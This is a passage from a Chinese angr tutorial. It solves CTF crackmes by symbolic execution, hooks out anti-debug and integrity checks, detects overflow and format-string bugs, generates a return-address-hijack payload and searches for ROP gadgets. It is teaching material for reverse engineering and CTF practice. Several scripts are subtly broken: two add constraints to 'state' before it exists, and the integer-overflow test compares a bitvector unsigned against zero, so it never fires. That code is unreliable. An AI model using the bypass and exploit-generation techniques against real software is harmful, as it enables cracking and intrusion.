        state.add_constraints(byte <= 0x7e)  # 可打印字符结束
    
    simgr = proj.factory.simulation_manager(state)
    
    # 通过输出内容判断是否成功
    def is_successful(state):
        stdout = state.posix.dumps(1)
        return b"Good Job!" in stdout
    
    simgr.explore(find=is_successful)
    
    if simgr.found:
        found_state = simgr.found[0]
        solution = found_state.posix.dumps(0)  # 读取 stdin
        solution = solution.split(b'\n')[0].split(b'\x00')[0]
        print(f"密码: {solution}")
        return solution
    else:
        print("未找到")
        return None
```

### 4.2 案例2：复杂条件判断（多分支路径探索）

#### 4.2.1 题目描述

程序包含多层嵌套的条件判断，模拟一个复杂的验证逻辑。这类题目手工分析繁琐，适合使用符号执行自动求解。

```c
// complex.c - 复杂条件判断
#include <stdio.h>

int validate(int a, int b, int c, int d) {
    if (a + b == 100) {
        if (b - c == 20) {
            if (c * d == 200) {
                if (a + d == 70) {
                    if (a > b) {
                        if (c < d) {
                            if (a * 2 + b == 150) {
                                return 1;
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}

int main() {
    int a, b, c, d;
    printf("Enter four numbers: ");
    scanf("%d %d %d %d", &a, &b, &c, &d);
    if (validate(a, b, c, d))
        printf("Correct!\n");
    else
        printf("Wrong!\n");
    return 0;
}
```

#### 4.2.2 解题脚本

```python
import angr
import claripy

def solve_complex():
    proj = angr.Project("./complex", auto_load_libs=False)
    
    # 直接从 validate 函数开始，传入 4 个符号参数
    validate_addr = 0x401130  # validate 函数地址
    
    # 创建4个32位符号整数
    a = claripy.BVS("a", 32)
    b = claripy.BVS("b", 32)
    c = claripy.BVS("c", 32)
    d = claripy.BVS("d", 32)
    
    # 添加约束：都是正整数，且在合理范围内
    for var in [a, b, c, d]:
        state.add_constraints(var >= 0)
        state.add_constraints(var <= 1000)
    
    # 创建调用状态
    state = proj.factory.call_state(validate_addr, a, b, c, d)
    
    simgr = proj.factory.simulation_manager(state)
    
    # 成功地址：validate 返回 1
    success_addr = 0x4011a0
    fail_addr = 0x4011b0
    
    simgr.explore(find=success_addr, avoid=fail_addr)
    
    if simgr.found:
        s = simgr.found[0]
        a_val = s.solver.eval(a)
        b_val = s.solver.eval(b)
        c_val = s.solver.eval(c)
        d_val = s.solver.eval(d)
        
        print(f"解: a={a_val}, b={b_val}, c={c_val}, d={d_val}")
        print(f"验证: a+b={a_val + b_val}, b-c={b_val - c_val}")
        print(f"     c*d={c_val * d_val}, a+d={a_val + d_val}")
        return (a_val, b_val, c_val, d_val)
    else:
        print("无解")
        return None
```

#### 4.2.3 求所有可能的解

```python
def find_all_solutions():
    proj = angr.Project("./complex", auto_load_libs=False)
    validate_addr = 0x401130
    
    a = claripy.BVS("a", 32)
    b = claripy.BVS("b", 32)
    c = claripy.BVS("c", 32)
    d = claripy.BVS("d", 32)
    
    state = proj.factory.call_state(validate_addr, a, b, c, d)
    
    # 约束范围
    for var in [a, b, c, d]:
        state.add_constraints(var >= 0)
        state.add_constraints(var <= 100)
    
    simgr = proj.factory.simulation_manager(state)
    
    success_addr = 0x4011a0
    solutions = []
    
    # 循环寻找多个解
    while True:
        simgr_copy = simgr.copy()
        simgr_copy.explore(find=success_addr)
        
        if not simgr_copy.found:
            break
            
        s = simgr_copy.found[0]
        a_val = s.solver.eval(a)
        b_val = s.solver.eval(b)
        c_val = s.solver.eval(c)
        d_val = s.solver.eval(d)
        
        sol = (a_val, b_val, c_val, d_val)
        if sol not in solutions:
            solutions.append(sol)
            print(f"找到解 #{len(solutions)}: {sol}")
        
        # 添加约束排除这个解，继续寻找下一个
        state.add_constraints(
            claripy.Or(
                a != a_val,
                b != b_val,
                c != c_val,
                d != d_val
            )
        )
        
        # 最多找 10 个解
        if len(solutions) >= 10:
            break
    
    print(f"\n共找到 {len(solutions)} 个解")
    return solutions
```

### 4.3 案例3：加密算法逆向（约束求解解密）

#### 4.3.1 题目描述

程序对输入进行某种变换（加密），然后与固定的密文比较。我们需要通过符号执行反向推导出原始输入。

```c
// crypto_crackme.c - 简单的加密验证
#include <stdio.h>
#include <string.h>

unsigned char target[] = {0x53, 0x72, 0x6a, 0x6d, 0x65, 0x7b, 0x33, 0x78, 0x61, 0x37, 0x7d};

void encrypt(unsigned char *input, int len) {
    for (int i = 0; i < len; i++) {
        input[i] ^= 0x1f;  // 简单的异或加密
        input[i] += 3;     // 加 3
    }
}

int check(char *input) {
    char buf[32];
    int len = strlen(input);
    if (len != 11)
        return 0;
    strcpy(buf, input);
    encrypt((unsigned char *)buf, len);
    for (int i = 0; i < len; i++) {
        if (buf[i] != target[i])
            return 0;
    }
    return 1;
}

int main() {
    char input[32];
    printf("Enter flag: ");
    scanf("%s", input);
    if (check(input))
        printf("Correct!\n");
    else
        printf("Wrong!\n");
    return 0;
}
```

#### 4.3.2 解题脚本

```python
import angr
import claripy

def solve_crypto():
    proj = angr.Project("./crypto_crackme", auto_load_libs=False)
    
    # 创建 11 字节的符号输入
    input_len = 11
    input_data = claripy.BVS("flag", 8 * input_len)
    
    # 所有字节都是可打印字符
    for i in range(input_len):
        byte = input_data.get_byte(i)
        state.add_constraints(byte >= 0x20)
        state.add_constraints(byte <= 0x7e)
    
    # 从 check 函数开始
    check_addr = 0x401150
    state = proj.factory.call_state(check_addr, input_data)
    
    simgr = proj.factory.simulation_manager(state)
    
    # 成功/失败地址
    success_addr = 0x4011d0  # return 1
    fail_addr = 0x4011c0     # return 0
    
    simgr.explore(find=success_addr, avoid=fail_addr)
    
    if simgr.found:
        s = simgr.found[0]
        flag = s.solver.eval(input_data, cast_to=bytes)
        print(f"Flag: {flag.decode()}")
        
        # 手动验证
        target = [0x53, 0x72, 0x6a, 0x6d, 0x65, 0x7b, 0x33, 0x78, 0x61, 0x37, 0x7d]
        result = []
        for i in range(input_len):
            enc = (flag[i] ^ 0x1f) + 3
            result.append(enc)
        print(f"加密结果: {bytes(result)}")
        print(f"目标密文: {bytes(target)}")
        print(f"匹配: {bytes(result) == bytes(target)}")
        
        return flag
    else:
        print("未找到 flag")
        return None
```

#### 4.3.3 更复杂的加密算法

对于更复杂的加密算法（如多轮变换、查表等），angr 的符号执行能力依然适用：

```python
# 模拟更复杂的加密（置换+异或+查表）
def solve_complex_crypto():
    import claripy
    
    # 直接用 claripy 模拟加密过程，不依赖二进制
    # 这在逆向算法已经明确时更高效
    
    target = [0x53, 0x72, 0x6a, 0x6d, 0x65, 0x7b, 0x33, 0x78, 0x61, 0x37, 0x7d]
    input_len = len(target)
    
    # 创建符号输入
    flag = [claripy.BVS(f"flag_{i}", 8) for i in range(input_len)]
    
    # 模拟加密过程
    encrypted = []
    for i in range(input_len):
        # 异或
        step1 = flag[i] ^ 0x1f
        # 加 3
        step2 = step1 + 3
        encrypted.append(step2)
    
    # 创建求解器
    solver = claripy.Solver()
    
    # 添加约束：加密结果等于目标
    for i in range(input_len):
        solver.add(encrypted[i] == target[i])
    
    # 添加可打印字符约束
    for i in range(input_len):
        solver.add(flag[i] >= 0x20)
        solver.add(flag[i] <= 0x7e)
    
    if solver.satisfiable():
        result = bytes([solver.eval(flag[i]) for i in range(input_len)])
        print(f"Flag: {result.decode()}")
        return result
    else:
        print("无解")
        return None
```

### 4.4 案例4：反逆向对抗（混淆代码分析）

#### 4.4.1 题目描述

程序使用了代码混淆技术（如不透明谓词、垃圾指令、控制流平坦化等），使得静态分析变得困难。符号执行可以绕过这些混淆，直接探索路径。

```c
// obfuscated.c - 混淆代码示例
#include <stdio.h>
#include <string.h>

int check(char *input) {
    int result = 0;
    int len = strlen(input);
    
    // 不透明谓词（总是为真的混淆判断）
    if (len * 0 + 1 == 1) {
        // 垃圾计算
        int x = 0;
        for (int i = 0; i < 100; i++)
            x += i;
        
        if (len == 6) {
            // 实际验证逻辑
            result = (input[0] == 'C' && input[1] == 'T' && 
                     input[2] == 'F' && input[3] == '{' &&
                     input[4] == '0' && input[5] == '}');
        }
    } else {
        // 死代码
        result = -1;
    }
    
    return result;
}

int main() {
    char buf[32];
    printf("Enter flag: ");
    scanf("%s", buf);
    if (check(buf))
        printf("Success!\n");
    else
        printf("Fail!\n");
    return 0;
}
```

#### 4.4.2 解题脚本

对于简单的混淆，angr 可以直接处理：

```python
import angr
import claripy

def solve_obfuscated():
    proj = angr.Project("./obfuscated", auto_load_libs=False)
    
    # 创建符号输入
    input_data = claripy.BVS("input", 8 * 32)
    
    state = proj.factory.entry_state(stdin=input_data)
    
    # 添加约束：输入是可打印字符
    for i in range(6):
        byte = input_data.get_byte(i)
        state.add_constraints(byte >= 0x20)
        state.add_constraints(byte <= 0x7e)
    
    simgr = proj.factory.simulation_manager(state)
    
    # 通过输出判断
    def success(state):
        return b"Success!" in state.posix.dumps(1)
    
    def fail(state):
        return b"Fail!" in state.posix.dumps(1)
    
    simgr.explore(find=success, avoid=fail)
    
    if simgr.found:
        s = simgr.found[0]
        flag = s.posix.dumps(0).split(b'\n')[0]
        print(f"Flag: {flag}")
        return flag
    else:
        print("未找到")
        return None
```

#### 4.4.3 处理控制流平坦化

对于控制流平坦化（Control Flow Flattening）等更复杂的混淆，可能需要结合其他技术：

```python
# 使用 Veritesting 技术加速混淆代码的分析
from angr.exploration_techniques import Veritesting

def solve_flattened():
    proj = angr.Project("./flattened_binary", auto_load_libs=False)
    
    input_data = claripy.BVS("input", 8 * 32)
    state = proj.factory.entry_state(stdin=input_data)
    
    simgr = proj.factory.simulation_manager(state)
    
    # Veritesting 可以有效处理某些类型的混淆
    veritesting = Veritesting(
        enable_veritesting=True,
        veritesting_max_states=50,
    )
    simgr.use_technique(veritesting)
    
    # 使用 LoopSeer 限制循环次数
    from angr.exploration_techniques import LoopSeer
    loop_seer = LoopSeer(loop_project=proj, limit=20)
    simgr.use_technique(loop_seer)
    
    def success(state):
        return b"Correct" in state.posix.dumps(1)
    
    simgr.explore(find=success)
    
    if simgr.found:
        s = simgr.found[0]
        solution = s.posix.dumps(0)
        print(f"Solution: {solution}")
        return solution
    
    return None
```

### 4.5 案例5：Patch文件与内存补丁技巧

#### 4.5.1 内存补丁（在执行前修改内存）

有时需要在程序执行前修改内存中的数据，比如替换校验值、修改关键常量等。

```python
import angr

def solve_with_memory_patch():
    proj = angr.Project("./binary", auto_load_libs=False)
    
    state = proj.factory.entry_state()
    
    # 修改内存中的数据
    # 例如：将地址 0x402000 处的字符串修改为指定值
    patch_addr = 0x402000
    patch_data = b"patched_string\x00"
    state.memory.store(patch_addr, patch_data)
    
    # 修改代码段（例如跳过某些检查）
    # 将 0x401100 处的指令改为 nop（0x90）
    # 注意：需要确保内存可写
    state.memory.store(0x401100, b"\x90\x90\x90\x90\x90")
    
    # 继续执行
    simgr = proj.factory.simulation_manager(state)
    simgr.run(n=100)
```

#### 4.5.2 使用 Hook 绕过检查

```python
import angr

def solve_with_hooks():
    proj = angr.Project("./binary", auto_load_libs=False)
    
    # Hook 掉反调试函数
    @proj.hook(0x401200, length=5)
    def bypass_antidebug(state):
        # 假设 0x401200 是一个反调试函数
        # 直接返回 0（表示未检测到调试器）
        state.regs.eax = 0
    
    # Hook 掉时间检查
    @proj.hook(0x401300, length=10)
    def bypass_time_check(state):
        # 跳过时间检查逻辑
        pass
    
    # Hook 掉完整性校验
    @proj.hook(0x401400, length=8)
    def bypass_integrity_check(state):
        state.regs.eax = 1  # 返回校验通过
    
    # 正常求解
    import claripy
    input_data = claripy.BVS("input", 8 * 64)
    state = proj.factory.entry_state(stdin=input_data)
    
    simgr = proj.factory.simulation_manager(state)
    simgr.explore(find=0x401500)
    
    if simgr.found:
        solution = simgr.found[0].posix.dumps(0)
        print(f"Solution: {solution}")
        return solution
    
    return None
```

#### 4.5.3 模拟自定义库函数

当题目使用了自定义的库函数，而 angr 没有对应的 SimProcedure 时，可以自己实现：

```python
from angr import SimProcedure
import claripy

class custom_hash(SimProcedure):
    """模拟自定义哈希函数"""
    
    def run(self, input_addr, output_addr):
        # 读取输入
        input_data = self.state.memory.load(input_addr, 32)
        
        # 简化的哈希模拟：返回符号值
        # 如果知道算法，可以精确模拟
        hash_result = claripy.BVS("custom_hash", 32)
        
        # 存储结果
        self.state.memory.store(output_addr, hash_result)
        
        return hash_result

def solve_custom_hash():
    proj = angr.Project("./binary_with_custom_hash", auto_load_libs=False)
    
    # 注册自定义 SimProcedure
    proj.hook_symbol("custom_hash", custom_hash())
    
    # 继续正常求解...
    input_data = claripy.BVS("input", 8 * 32)
    state = proj.factory.entry_state(stdin=input_data)
    
    simgr = proj.factory.simulation_manager(state)
    
    def success(state):
        return b"Correct" in state.posix.dumps(1)
    
    simgr.explore(find=success)
    
    if simgr.found:
        s = simgr.found[0]
        solution = s.posix.dumps(0)
        print(f"Solution: {solution}")
        return solution
    
    return None
```

#### 4.5.4 使用 Unicorn 加速具体执行

对于大量具体执行的场景，可以启用 Unicorn 引擎加速：

```python
def solve_with_unicorn():
    proj = angr.Project("./binary", auto_load_libs=False)
    
    # 启用 Unicorn 加速
    state = proj.factory.entry_state(
        add_options={angr.options.UNICORN},
    )
    
    # 也可以在模拟管理器层面设置
    simgr = proj.factory.simulation_manager(state)
    simgr.use_technique(angr.exploration_techniques.Uniquifier())
    
    # 执行
    simgr.explore(find=0x401500)
```

### 4.6 CTF解题通用模板

下面是一个通用的 angr CTF 解题模板，可以根据具体题目修改：

```python
import angr
import claripy
import sys

def solve_ctf(binary_path, input_type="stdin", **kwargs):
    """
    通用 CTF 解题模板
    
    Args:
        binary_path: 二进制文件路径
        input_type: 输入类型 ("stdin", "arg", "env", "memory")
        **kwargs: 其他参数
    """
    # 1. 加载二进制
    proj = angr.Project(
        binary_path,
        auto_load_libs=False,
        main_opts=kwargs.get('main_opts', {}),
    )
    
    print(f"[*] 加载 {binary_path}")
    print(f"[*] 架构: {proj.arch.name}")
    print(f"[*] 入口点: {hex(proj.entry)}")
    
    # 2. 创建符号输入
    input_len = kwargs.get('input_len', 64)
    
    if input_type == "stdin":
        input_data = claripy.BVS("input", 8 * input_len)
        state = proj.factory.entry_state(stdin=input_data)
    elif input_type == "arg":
        input_data = claripy.BVS("input", 8 * input_len)
        state = proj.factory.entry_state(args=[binary_path, input_data])
    elif input_type == "env":
        env_var = kwargs.get('env_var', 'INPUT')
        input_data = claripy.BVS("input", 8 * input_len)
        state = proj.factory.entry_state(env={env_var: input_data})
    elif input_type == "blank":
        input_data = claripy.BVS("input", 8 * input_len)
        start_addr = kwargs.get('start_addr', proj.entry)
        state = proj.factory.blank_state(addr=start_addr)
    else:
        raise ValueError(f"不支持的输入类型: {input_type}")
    
    # 3. 添加约束（可选）
    if kwargs.get('printable_only', False):
        for i in range(input_len):
            byte = input_data.get_byte(i)
            state.add_constraints(byte >= 0x20)
            state.add_constraints(byte <= 0x7e)
    
    # 4. 创建 Simulation Manager
    simgr = proj.factory.simulation_manager(state)
    
    # 5. 设置 find 和 avoid
    find = kwargs.get('find', None)
    avoid = kwargs.get('avoid', None)
    
    if find is None:
        # 默认：通过输出判断
        success_str = kwargs.get('success_str', b'Correct')
        find = lambda s: success_str in s.posix.dumps(1)
    
    if avoid is None:
        fail_str = kwargs.get('fail_str', b'Wrong')
        avoid = lambda s: fail_str in s.posix.dumps(1)
    
    # 6. 应用探索技术（可选）
    if kwargs.get('veritesting', False):
        from angr.exploration_techniques import Veritesting
        simgr.use_technique(Veritesting(enable_veritesting=True))
    
    if kwargs.get('loop_limit', None):
        from angr.exploration_techniques import LoopSeer
        simgr.use_technique(LoopSeer(loop_project=proj, limit=kwargs['loop_limit']))
    
    # 7. 开始探索
    print("[*] 开始符号执行...")
    simgr.explore(
        find=find,
        avoid=avoid,
        num_find=kwargs.get('num_find', 1),
    )
    
    # 8. 输出结果
    if simgr.found:
        print(f"[+] 找到 {len(simgr.found)} 个解！")
        for i, s in enumerate(simgr.found):
            if input_type == "stdin":
                sol = s.posix.dumps(0)
            elif input_type == "arg":
                sol = s.solver.eval(input_data, cast_to=bytes)
            elif input_type == "env":
                sol = s.solver.eval(input_data, cast_to=bytes)
            else:
                sol = s.solver.eval(input_data, cast_to=bytes)
            
            # 清理输出
            sol = sol.split(b'\x00')[0].split(b'\n')[0]
            try:
                sol_str = sol.decode()
            except:
                sol_str = repr(sol)
            
            print(f"  解 #{i+1}: {sol_str}")
        
        return simgr.found
    else:
        print("[-] 未找到解")
        print(f"    活跃状态: {len(simgr.active)}")
        print(f"    死路状态: {len(simgr.deadended)}")
        print(f"    避免状态: {len(simgr.avoid)}")
        return None

# 使用示例
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <binary>")
        sys.exit(1)
    
    solve_ctf(
        sys.argv[1],
        input_type="stdin",
        input_len=32,
        printable_only=True,
        success_str=b"Correct",
        fail_str=b"Wrong",
    )
```

---

## 5. 漏洞挖掘与利用

符号执行不仅可以用于 CTF 解题，在漏洞挖掘和利用开发中也发挥着重要作用。本章介绍如何使用 angr 进行漏洞发现和利用辅助。

### 5.1 使用angr发现漏洞

#### 5.1.1 缓冲区溢出检测

缓冲区溢出是最常见的漏洞类型之一。使用符号执行，我们可以让输入数据完全符号化，然后检测程序是否能够访问到缓冲区边界之外的内存。

```python
import angr
import claripy

def detect_buffer_overflow(binary_path, buffer_size=64):
    """检测缓冲区溢出漏洞"""
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # 创建一个很大的符号输入
    input_data = claripy.BVS("input", 8 * (buffer_size + 200))
    
    state = proj.factory.entry_state(
        stdin=input_data,
        add_options={angr.options.STRICT_PAGE_ACCESS},
    )
    
    simgr = proj.factory.simulation_manager(state)
    
    # 定义溢出检测函数
    def check_overflow(state):
        # 检查是否发生了错误（如段错误）
        if state.history.jumpkind == 'Ijk_Exit':
            return False
        
        # 检查指令指针是否被符号数据污染
        # 如果 rip 包含我们的符号变量，说明可能发生了溢出
        ip = state.regs.ip
        if ip.symbolic:
            # 检查 ip 是否与 input_data 有关
            if any(input_data in var for var in ip.variables):
                print(f"[!] 检测到可能的溢出！地址: {hex(state.addr)}")
                print(f"    IP = {ip}")
                return True
        
        return False
    
    # 使用自定义探索技术检测溢出
    from angr.exploration_techniques import ExplorationTechnique
    
    class OverflowDetector(ExplorationTechnique):
        def __init__(self):
            super().__init__()
            self.overflow_states = []
        
        def step_state(self, simgr, state, **kwargs):
            # 检查当前状态是否有溢出迹象
            if check_overflow(state):
                self.overflow_states.append(state.copy())
            
            return simgr.step_state(state, **kwargs)
    
    detector = OverflowDetector()
    simgr.use_technique(detector)
    
    # 运行符号执行
    try:
        simgr.run(n=5000)
    except Exception as e:
        print(f"执行出错: {e}")
    
    # 输出结果
    if detector.overflow_states:
        print(f"\n[+] 发现 {len(detector.overflow_states)} 个可能的溢出状态")
        for i, s in enumerate(detector.overflow_states[:5]):
            ip_val = s.solver.eval(s.regs.ip)
            print(f"  #{i}: 溢出时 IP = {hex(ip_val)}")
            # 尝试求解导致溢出的输入
            try:
                input_sol = s.posix.dumps(0)
                print(f"      输入: {input_sol[:80]}...")
            except:
                print(f"      无法求解输入")
        
        return detector.overflow_states
    else:
        print("[-] 未检测到缓冲区溢出")
        return None
```

#### 5.1.2 格式化字符串漏洞检测

```python
import angr
import claripy

def detect_format_string(binary_path):
    """检测格式化字符串漏洞"""
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # 创建符号输入
    input_data = claripy.BVS("input", 8 * 128)
    
    # 添加格式化字符串特征
    # 如果用户输入包含 %x、%n 等格式说明符，且被直接用作 printf 的格式串
    # 则可能存在格式化字符串漏洞
    
    state = proj.factory.entry_state(stdin=input_data)
    
    # Hook printf 来检查格式串参数
    from angr import SimProcedure
    
    class PrintfHook(SimProcedure):
        def run(self, fmt_ptr):
            # 读取格式字符串
            fmt = self.state.memory.load(fmt_ptr, 128)
            
            # 检查格式串是否包含符号数据（即用户可控）
            if fmt.symbolic:
                # 检查是否可能包含格式说明符
                # 简化检测：检查格式串是否与输入有关
                fmt_vars = fmt.variables
                input_vars = input_data.variables
                if fmt_vars & input_vars:
                    print(f"[!] 检测到格式化字符串漏洞！")
                    print(f"    格式串地址: {hex(fmt_ptr)}")
                    print(f"    格式串包含用户可控数据")
                    
                    # 保存到状态中供后续分析
                    self.state.globals['format_string_vuln'] = True
            
            # 调用原始的 printf SimProcedure
            return angr.SIM_PROCEDURES['libc']['printf'].run(self, fmt_ptr)
    
    # 注册 Hook
    proj.hook_symbol("printf", PrintfHook())
    
    simgr = proj.factory.simulation_manager(state)
    
    # 运行
    simgr.run(n=2000)
    
    # 检查是否有状态触发了漏洞
    vuln_found = False
    for stash in [simgr.active, simgr.deadended, simgr.errored]:
        for s in stash:
            if s.globals.get('format_string_vuln', False):
                vuln_found = True
                break
        if vuln_found:
            break
    
    if vuln_found:
        print("[+] 存在格式化字符串漏洞")
    else:
        print("[-] 未检测到格式化字符串漏洞")
    
    return vuln_found
```

#### 5.1.3 整数溢出检测

```python
import angr
import claripy

def detect_integer_overflow(binary_path):
    """检测整数溢出"""
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # 创建符号输入
    input_a = claripy.BVS("a", 32)
    input_b = claripy.BVS("b", 32)
    
    # 假设存在一个计算函数
    calc_addr = 0x401130
    state = proj.factory.call_state(calc_addr, input_a, input_b)
    
    # 设置较大的取值范围以触发溢出
    state.add_constraints(input_a > 0x70000000)
    state.add_constraints(input_b > 0x70000000)
    
    simgr = proj.factory.simulation_manager(state)
    
    # 定义溢出条件：结果为负数（有符号溢出）或 回绕
    def detect_overflow(state):
        # 检查函数返回值
        result = state.regs.eax
        
        # 检测有符号溢出：两个正数相加得到负数
        constraint = claripy.And(
            input_a > 0,
            input_b > 0,
            result < 0
        )
        
        if state.solver.satisfiable(extra_constraints=[constraint]):
            print("[!] 检测到有符号整数溢出！")
            a_val = state.solver.eval(input_a, extra_constraints=[constraint])
            b_val = state.solver.eval(input_b, extra_constraints=[constraint])
            r_val = state.solver.eval(result, extra_constraints=[constraint])
            print(f"    a = {a_val} (0x{a_val:08x})")
            print(f"    b = {b_val} (0x{b_val:08x})")
            print(f"    result = {r_val} (0x{r_val:08x})")
            return True
        
        return False
    
    # 逐步执行并检测
    while len(simgr.active) > 0:
        simgr.step()
        for s in simgr.active:
            if detect_overflow(s):
                return True
    
    print("[-] 未检测到整数溢出")
    return False
```

### 5.2 自动化漏洞利用生成

angr 可以辅助生成漏洞利用代码，特别是在控制流劫持类漏洞中。

#### 5.2.1 控制流劫持检测与验证

```python
import angr
import claripy

def exploit_buffer_overflow(binary_path, buffer_offset, return_addr_offset):
    """
    生成缓冲区溢出利用
    
    Args:
        binary_path: 二进制文件路径
        buffer_offset: 缓冲区相对于 ebp 的偏移
        return_addr_offset: 返回地址相对于输入的偏移
    """
    proj = angr.Project(binary_path, auto_load_libs=False)
    
    # 创建符号输入（足够大以覆盖返回地址）
    payload_size = return_addr_offset + 32
    payload = claripy.BVS("payload", 8 * payload_size)
    
    state = proj.factory.entry_state(stdin=payload)
    
    # 目标：控制 eip/rip 寄存器
    target_addr = 0x401200  # 例如：shellcode 或 gadget 地址
    
    simgr = proj.factory.simulation_manager(state)
    
    # 查找 eip 被控制的状态
    def find_eip_control(state):
        ip = state.regs.ip
        if not ip.symbolic:
            return False
        
        # 检查 IP 是否可以被设置为目标地址
        if state.solver.satisfiable(extra_constraints=[ip == target_addr]):
            return True
        
        return False
    
    # 探索
    simgr.explore(find=find_eip_control)
    
    if simgr.found:
        s = simgr.found[0]
        print("[+] 成功控制指令指针！")
        
        # 设置 IP 为目标地址
        s.add_constraints(s.regs.ip == target_addr)
        
        # 求解 payload
        if s.solver.satisfiable():
            exploit_payload = s.posix.dumps(0)
            print(f"[+] Exploit payload 生成成功，长度: {len(exploit_payload)} 字节")
            print(f"    Payload (hex): {exploit_payload.hex()}")
            
            # 验证：返回地址位置的值
            ret_addr_bytes = exploit_payload[return_addr_offset:return_addr_offset+4]
            ret_addr = int.from_bytes(ret_addr_bytes, 'little')
            print(f"    返回地址: {hex(ret_addr)}")
            
            return exploit_payload
        else:
            print("[-] 无法求解满足条件的 payload")
            return None
    else:
        print("[-] 未能控制指令指针")
        return None
```

### 5.3 ROP链辅助构造

angr 可以辅助 ROP（Return-Oriented Programming）链的构造，特别是通过 angrop 插件（将在第7章详细介绍）。这里先介绍基本思路。

#### 5.3.1 手动搜索 Gadget

```python
import angr
import claripy

def find_gadgets(proj, gadget_type="pop_ret"):
    """
    简单的 gadget 搜索
    注意：实际使用建议用 angrop 或 ROPgadget 工具
    """
    gadgets = []
    main_obj = proj.loader.main_object
    
    # 遍历可执行段
    for seg in main_obj.segments:
        if seg.is_executable:
            # 读取段数据
            data = proj.loader.memory.load(seg.vaddr, seg.memsize)
            
            # 搜索 ret 指令 (0xc3)
            pos = 0
            while True:
                ret_pos = data.find(b'\xc3', pos)
                if ret_pos == -1:
                    break
                
                # 检查 ret 前面是否有有用的指令
                gadget_addr = seg.vaddr + ret_pos
                
                # 简单模式：pop + ret
                # pop eax = 0x58, pop ebx = 0x5b, ...
                for i in range(1, 10):  # 向前找最多10字节
                    if ret_pos - i >= 0:
                        gadget_start = ret_pos - i
                        gadget_bytes = data[gadget_start:ret_pos+1]
                        
                        # 检查是否是有效的 gadget（以 ret 结尾）
                        # 这里简化处理，实际需要反汇编验证
                        if gadget_bytes.endswith(b'\xc3'):
                            addr = seg.vaddr + gadget_start
                            gadgets.append((addr, gadget_bytes))
                
                pos = ret_pos + 1
    
    return gadgets
```

#### 5.3.2 使用符号执行验证 ROP 链

```python
def verify_rop_chain(proj, rop_chain, initial_state, target_state_check):
    """
    使用符号执行验证 ROP 链是否能达到目标状态
    
    Args:
        proj: angr Project
        rop_chain: ROP 链地址列表
        initial_state: 初始状态
        target_state_check: 检查是否达到目标的函数
    """
    state = initial_state.copy()
    
    # 将 ROP 链布置到栈上
    current_sp = state.solver.eval(state.regs.esp)
    
    for i, addr in enumerate(rop_chain):
        state.memory.store(current_sp + i * 4, 
                          claripy.BVV(addr, 32), 
                          endness='Iend_LE')
    
    # 设置 eip 为第一个 gadget
    state.regs.eip = rop_chain[0]
    
    simgr = proj.factory.simulation_manager(state)
    
    # 逐步执行 ROP 链
    steps = 0
    max_steps = len(rop_chain) * 10 + 20
    
    while steps < max_steps and len(simgr.active) > 0:
        simgr.step()
        steps += 1
        
        # 检查是否达到目标
        for s in simgr.active:
            if target_state_check(s):
                print(f"[+] ROP 链在 {steps} 步后达到目标状态")
                return True
    
    print("[-] ROP 链未能达到目标状态")
    return False
```

### 5.4 与其他工具结合

#### 5.4.1 IDA 插件集成

angr 可以与 IDA Pro 结合使用，利用 IDA 的反汇编和反编译结果辅助符号执行。

```python
# 在 IDA 中使用 angr（需要安装 angr-management 或 angr IDA 插件）
# 以下是 IDA 脚本示例

def angr_in_ida():
    """
    在 IDA 中结合 angr 使用
    
    需要安装: https://github.com/angr/angr-management
    或使用 binsync 等同步工具
    """
    import idautils
    import idc
    
    # 1. 从 IDA 获取函数信息
    func_ea = idc.get_name_ea_simple("check_password")
    if func_ea == idaapi.BADADDR:
        print("找不到函数")
        return
    
    # 2. 获取函数的起始和结束地址
    func = idaapi.get_func(func_ea)
    start_ea = func.start_ea
    end_ea = func.end_ea
    
    print(f"函数地址: {hex(start_ea)} - {hex(end_ea)}")
    
    # 3. 启动 angr 分析
    # （在 IDA 外部运行 angr 脚本，使用 IDA 中获得的地址信息）
    print("使用以下地址运行 angr 脚本:")
    print(f"  函数入口: {hex(start_ea)}")
    
    # 4. 获取成功/失败分支地址
    # 遍历函数中的基本块，找到返回 1 和返回 0 的位置
    success_addrs = []
    fail_addrs = []
    
    for block in idautils.FuncItems(func_ea):
        # 简化：查找 mov eax, 1 / ret 和 mov eax, 0 / ret
        mnem = idc.print_insn_mnem(block)
        if mnem == "mov":
            op0 = idc.print_operand(block, 0)
            op1 = idc.print_operand(block, 1)
            if op0 == "eax" and op1 == "1":
                # 检查下一条是否是 ret
                next_ea = idc.next_head(block)
                if idc.print_insn_mnem(next_ea) == "retn":
                    success_addrs.append(block)
            elif op0 == "eax" and op1 == "0":
                next_ea = idc.next_head(block)
                if idc.print_insn_mnem(next_ea) == "retn":
                    fail_addrs.append(block)
    
    print(f"成功地址: {[hex(a) for a in success_addrs]}")
    print(f"失败地址: {[hex(a) for a in fail_addrs]}")
    
    return {
        'func_start': start_ea,
        'func_end': end_ea,
        'success': success_addrs,
        'fail': fail_addrs,
    }
```

#### 5.4.2 GDB 集成

```python
# 使用 angr 辅助 GDB 调试
# 可以先用 angr 求解出触发漏洞的输入，再用 GDB 验证

def generate_crash_input(binary_path, crash_addr):
    """生成导致崩溃的输入"""
    import angr
    import claripy
    
    proj = angr.Project(binary_path, auto_load_libs=False)
    input_data = claripy.BVS("input", 8 * 200)
    
    state = proj.factory.entry_state(stdin=input_data)
    simgr = proj.factory.simulation_manager(state)
    
    # 找到导致崩溃的状态
    def is_crash(state):
        # 段错误或访问非法内存
        if state.history.jumpkind == 'Ijk_Exit':
            return True
        # 或者到达特定的崩溃点
        if state.addr == crash_addr:
            return True
        return False
    
    simgr.explore(find=is_crash)
    
    if simgr.found:
        s = simgr.found[0]
        crash_input = s.posix.dumps(0)
        
        # 保存到文件供 GDB 使用
        with open("crash_input.bin", "wb") as f:
            f.write(crash_input)
        
        print(f"[+] 崩溃输入已保存到 crash_input.bin")
        print(f"    在 GDB 中使用: run < crash_input.bin")
        
        return crash_input
    
    return None

# GDB 脚本示例（在 GDB 中运行）
gdb_script = """
# GDB 中使用 angr 生成的输入
file ./vulnerable_binary
run < crash_input.bin
bt
info registers
x/20x $sp
"""
```

#### 5.4.3 与模糊测试（Fuzzing）结合

符号执行可以为模糊测试生成高质量的种子输入，反之模糊测试也可以帮助符号执行快速到达深层代码路径。

```python
